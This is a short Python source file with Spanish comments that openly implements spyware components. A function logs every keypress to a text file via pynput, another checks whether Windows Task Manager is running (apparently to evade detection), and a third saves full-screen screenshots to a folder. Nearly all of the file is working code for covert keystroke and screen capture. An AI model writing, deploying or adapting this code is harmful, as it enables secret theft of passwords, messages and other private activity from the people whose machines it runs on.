import psutil
from pynput.keyboard import Listener
import pyautogui
import os


def listener_teclado(key, fileName):
	letter = str(key)
	letter = letter.replace("'","")
	if letter == 'Key.space':
		letter = ' '
	with open(f"{fileName}.txt", 'a') as f:
		f.write(letter)

def listen(fileName:str="log"): #Función de keylogger
    while True:
        with Listener( on_press=lambda key: listener_teclado(key, fileName)) as listener:
            listener.join()


def is_task_manager_open(): #Función para comprobar si el task manager está abierto
    for process in psutil.process_iter(['name']):
        if process.info['name'] == 'Taskmgr.exe':
            return True
    return False

    # Captura la pantalla completa y guarda la imagen como "screenshot.png"
def takeScreenShot(imageName:str="screenShot", path:str="pictures"):
    if not os.path.exists(path):
        os.makedirs(path)
        
    # Capturar la pantalla y guardar con nombre personalizado
    pyautogui.screenshot(os.path.join(path, f"{imageName}.png"))